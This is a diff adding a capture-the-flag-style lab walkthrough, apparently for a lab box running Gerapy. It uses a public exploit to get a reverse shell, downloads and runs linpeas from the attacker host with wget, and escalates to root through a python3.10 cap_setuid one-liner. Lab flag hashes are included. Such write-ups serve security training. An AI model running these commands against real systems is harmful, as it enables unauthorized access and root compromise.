@@ -41,4 +41,64 @@ python3 50640.py 50640.py -t http://192.168.146.24 -p 8000 -L 192.168.45.208 -P 
 ```
 An error comes back up when running the exploit without creating a project. So I went ahead and created a project and reran the exploit and got a shell.
 <img width="680" height="260" alt="image" src="https://github.com/user-attachments/assets/eab6b0cd-28f9-4dba-b1ab-a72ef277c187" />
+```
+app@ubuntu:~/gerapy$ id 
+id 
+uid=1000(app) gid=1000(app) groups=1000(app)
+app@ubuntu:~/gerapy$ whoami
+app
+app@ubuntu:~$ cd ../
+app@ubuntu:~$ cat local.txt
+cat local.txt
+be5743a40d69fa073b4955828037fe7a
+```
+### Privesc to Root (Automated) 
+While conducting mannual recon, we can try to run linpeas (automated linux recon tool).
+With linpeas, usually red/orange are indicators to look out for. 
+In this case, linpeas does show that there is a linux binary capability `CAP_SETUID`. 
+```
+# On attacker terminal (terminal #1)
+# have a http server open where linpeas script is to server files to any machine on this network from this directory. In this case, I chose port 8000 but can usually be any high number port available. 
+┌──(kali㉿kali)-[~/tools]
+-rwxrwxr-x  1 kali kali 1090032 Jul 15 02:21 linpeas.sh
+python3 -m http.server 8000
 
+# On shell session, in tmp or user home directory 
+app@ubuntu:~$ wget http://192.168.45.208:8000/linpeas.sh
+app@ubuntu:~$ chmod u+x linpeas.sh
+app@ubuntu:~$ ./linpeas.sh
+
+...
+# linpeas results show: 
+Capabilities
+/usr/bin/python3.10 cap_setuid=ep
+```
+<img width="885" height="128" alt="image" src="https://github.com/user-attachments/assets/0b48a5bb-5f2c-44e3-9ed0-c76fdff419b7" />
+
+```
+# check machine shell session
+app@ubuntu:~$ which python3.10
+/usr/bin/python3.10
+# python with cap_setuid+ep - spawns a bash shell with root privileges
+app@ubuntu:~$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+whoami
+root
+/bin/bash -i
+root@ubuntu:~# ls
+...
+root@ubuntu:~# cd /root 
+root@ubuntu:~# ls
+...
+root@ubuntu:/root# cat proof.txt
+cat proof.txt
+d7a347c050bfbc17f2af452132b87a32
+```
+### Privesc to Root (Manual check)
+```
+# Searching for exploitable capabilities
+# cap_setuid+ep - Can change UID
+app@ubuntu:~$ getcap -r / 2>/dev/null
+...
+/usr/bin/python3.10 cap_setuid=ep
+_do the same as above_
+```
